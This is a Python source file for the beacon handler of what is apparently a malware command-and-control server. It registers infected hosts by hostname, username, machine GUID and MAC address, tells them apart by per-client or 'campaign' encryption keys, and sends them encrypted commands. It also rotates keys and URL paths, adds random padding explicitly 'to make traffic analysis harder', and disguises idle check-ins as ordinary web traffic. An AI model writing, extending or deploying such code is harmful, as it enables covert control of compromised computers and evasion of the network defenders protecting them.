import logging
import json
import base64
import re
import uuid
import hashlib
import random
import string
import urllib.parse

logger = logging.getLogger(__name__)

from handlers.base_handler import BaseHandler

class BeaconHandler(BaseHandler):
    """Handler for beacon requests from clients"""
    
    def handle(self, include_rotation_info=False):
        """
        Process a beacon request from a client
        
        Args:
            include_rotation_info: Whether to include path rotation information
        """
        self.log_message(f"Beacon received from {self.client_address[0]}")
        
        try:
            # Handle either GET or POST requests
            method = self.request_handler.command
            
            if method == "GET":
                self._handle_get_beacon(include_rotation_info)
            else:  # POST
                self._handle_post_beacon(include_rotation_info)
                
        except Exception as e:
            logger.error(f"Error handling beacon: {str(e)}")
            self.send_error_response(500, "Internal server error")
    
    def _handle_get_beacon(self, include_rotation_info=False):
        """Handle a beacon sent via GET request"""
        try:
            # Parse the query string for data and token
            query_string = self.request_handler.path.split('?', 1)[1] if '?' in self.request_handler.path else ''
            query_params = {}
            
            if query_string:
                for param in query_string.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        query_params[key] = urllib.parse.unquote(value)
            
            encrypted_data = query_params.get('data')
            token = query_params.get('token', '')
            
            if token:
                self.log_message(f"Received GET beacon with {len(token)} bytes of token padding")
            
            if not encrypted_data:
                self.send_error_response(400, "Missing data parameter")
                return
            
            # Process the beacon data - same for both GET and POST
            self._process_beacon_data(encrypted_data, token, include_rotation_info)
            
        except Exception as e:
            logger.error(f"Error handling GET beacon: {str(e)}")
            self.send_error_response(500, "Internal server error")
    
    def _handle_post_beacon(self, include_rotation_info=False):
        """Handle a beacon sent via POST request"""
        try:
            # Read content data
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length == 0:
                self.send_error_response(400, "Missing content")
                return
                
            request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
            
            # Parse the JSON body
            try:
                body_data = json.loads(request_body)
                encrypted_data = body_data.get('data')
                
                # Extract token padding (we just need to log it)
                token = body_data.get('token', '')
                if token:
                    self.log_message(f"Received POST beacon with {len(token)} bytes of token padding")
                
                if not encrypted_data:
                    self.send_error_response(400, "Missing data field")
                    return
                
                # Process the beacon data - same for both GET and POST
                self._process_beacon_data(encrypted_data, token, include_rotation_info, body_data)
                
            except json.JSONDecodeError:
                self.send_error_response(400, "Invalid JSON format")
                return
                
        except Exception as e:
            logger.error(f"Error handling POST beacon: {str(e)}")
            self.send_error_response(500, "Internal server error")
    
    def _process_beacon_data(self, encrypted_data, token="", include_rotation_info=False, body_data=None):
        """Process beacon data common to both GET and POST methods"""
        # Extract first_contact flag from body_data if available (for POST)
        is_first_contact = False
        rotation_id = None
        
        if body_data:
            is_first_contact = body_data.get('first_contact', False)
            rotation_id = body_data.get('rotation_id')
        
        # Process first contact differently
        if is_first_contact:
            # For first contact, generate a new client ID and handle system info directly
            client_id = self._generate_client_id()
            system_info_raw = encrypted_data  # Should be unencrypted JSON for first contact
            # Log that we're handling first contact
            self.log_message(f"Handling first contact - generated client ID: {client_id}")
            
            try:
                # Parse the system info
                system_info = json.loads(system_info_raw) if isinstance(system_info_raw, str) else system_info_raw
            except json.JSONDecodeError:
                self.log_message("Invalid system info format in first contact")
                self.send_error_response(400, "Invalid system info format")
                return
            
            # Register the new client
            client_id = self.client_manager.add_client(
                ip=self.client_address[0],
                hostname=system_info.get('Hostname', 'Unknown'),
                username=system_info.get('Username', 'Unknown'),
                machine_guid=system_info.get('MachineGuid', 'Unknown'),
                os_version=system_info.get('OsVersion', 'Unknown'),
                mac_address=system_info.get('MacAddress', 'Unknown'),
                system_info=system_info,
                client_id=client_id
            )
            
            # Mark as new identification and first contact
            newly_identified = True
            first_contact = True
            
        else:
            # For established clients, identify by encryption key
            client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
            
            if client_id is None and decrypted_data is None:
                # No key could decrypt the data - fail
                self.send_error_response(400, "Authentication failed - could not decrypt data")
                return
            
            # If we have data but no client ID, we're in an odd state
            if client_id is None and decrypted_data is not None:
                # This is likely a client with the campaign key - treat as first contact
                client_id = self._generate_client_id()
                self.log_message(f"Client using campaign key - treating as first contact with ID: {client_id}")
                newly_identified = True
                first_contact = True
            else:
                # Normal established client
                newly_identified = False
                first_contact = False
            
            # Parse the system info if we have it
            try:
                system_info = json.loads(decrypted_data) if isinstance(decrypted_data, str) else decrypted_data
            except (json.JSONDecodeError, TypeError):
                self.log_message(f"Could not parse system info for client {client_id}")
                system_info = {"Hostname": "Unknown", "IP": self.client_address[0]}
            
            # Update client information
            if not first_contact:
                self.client_manager.add_client(
                    ip=self.client_address[0],
                    hostname=system_info.get('Hostname', 'Unknown'),
                    username=system_info.get('Username', 'Unknown'),
                    machine_guid=system_info.get('MachineGuid', 'Unknown'),
                    os_version=system_info.get('OsVersion', 'Unknown'),
                    mac_address=system_info.get('MacAddress', 'Unknown'),
                    system_info=system_info,
                    client_id=client_id
                )
        
        # Log the beacon
        self.log_message(f"Identified client {client_id} ({system_info.get('Hostname', 'Unknown')}){' - FIRST CONTACT' if first_contact else ''}")
        
        # Verify client if system info is available and not first contact
        needs_key_rotation = False
        if system_info and not first_contact:
            _, _, needs_key_rotation, _ = self.client_helper.verify_client(client_id, system_info)
        
        # Always issue a key for first contact
        if first_contact:
            needs_key_rotation = True
        
        # Organize commands for the client
        commands, has_key_operation = self.client_helper.organize_commands(
            client_id, 
            include_key_rotation=needs_key_rotation,
            first_contact=first_contact
        )
        
        # Add path rotation command if needed for established clients
        if include_rotation_info and not first_contact:
            path_rotation_command = self.path_router.create_path_rotation_command()
            commands.append(path_rotation_command)
            self.log_message(f"Sending path rotation info to client {client_id}")
        
        # Log commands being sent
        for command in commands:
            cmd_type = command['command_type']
            args = command['args'] if cmd_type not in ['key_rotation', 'key_issuance'] else '[REDACTED KEY]'
            self.client_manager.log_event(client_id, "Command sent", f"Type: {cmd_type}, Args: {args}")
        
        # Send response to client
        self._send_beacon_response(client_id, commands, has_key_operation, first_contact, include_rotation_info)
        
        # Clear key rotation commands after delivery
        if has_key_operation and not first_contact:
            self.client_helper.clear_commands_after_rotation(client_id)
    
    def _generate_client_id(self):
        """Generate a unique client ID for new clients"""
        # Create a random UUID and take the first 8 characters
        random_id = str(uuid.uuid4())[:8]
        # Return a simple string ID
        return f"client_{random_id}"
    
    def _send_beacon_response(self, client_id, commands, has_key_operation, first_contact, include_rotation_info):
        """Send the response to the client beacon"""
        # For first contact or key operations, we need to send more detailed information
        if first_contact or has_key_operation or include_rotation_info or commands:
            # Prepare response data
            response_data = {
                "commands": commands,
                "first_contact": first_contact,
                "encrypted": False
            }
            
            # Add key operation flags only if needed
            if has_key_operation:
                if first_contact:
                    response_data["key_issuance"] = True
                else:
                    response_data["key_rotation"] = True
            
            # Add path rotation info if requested
            if include_rotation_info:
                rotation_info = self.path_router.get_rotation_info()
                response_data["rotation_info"] = rotation_info
            else:
                # Only include minimal rotation info if needed
                rotation_info = {
                    "current_rotation_id": self.path_router.path_manager.rotation_counter,
                    "next_rotation_time": self.path_router.path_manager.get_next_rotation_time()
                }
                response_data["rotation_info"] = rotation_info
            
            # For established clients with encryption, encrypt the commands
            if not first_contact and commands:
                # Convert commands to JSON string for encryption
                commands_json = json.dumps(commands)
                
                # Encrypt the commands
                encrypted_commands = self.crypto_helper.encrypt(commands_json, client_id)
                
                # Replace commands with encrypted version
                response_data["commands"] = encrypted_commands
                response_data["encrypted"] = True
            
            # Add random padding to the response to vary payload size using 'token' field
            self._add_random_token(response_data)
            
            # Send the response as JSON
            self.send_response(200, "application/json", json.dumps(response_data))
        else:
            # For regular check-ins with no commands, just send a simple "OK" response
            # This looks more like normal web traffic
            self.send_response(200, "text/plain", "OK")
    
    def _add_random_token(self, response_data):
        """Add random padding to response using 'token' field to make traffic analysis harder"""
        # Generate a truly random length between 50 and 500 characters
        padding_length = random.randint(50, 500)
        
        # Generate random padding content
        chars = string.ascii_letters + string.digits
        padding = ''.join(random.choice(chars) for _ in range(padding_length))
        
        # Add padding to response data as 'token' field
        response_data["token"] = padding
        
        logger.debug(f"Added {padding_length} bytes of padding to response token field")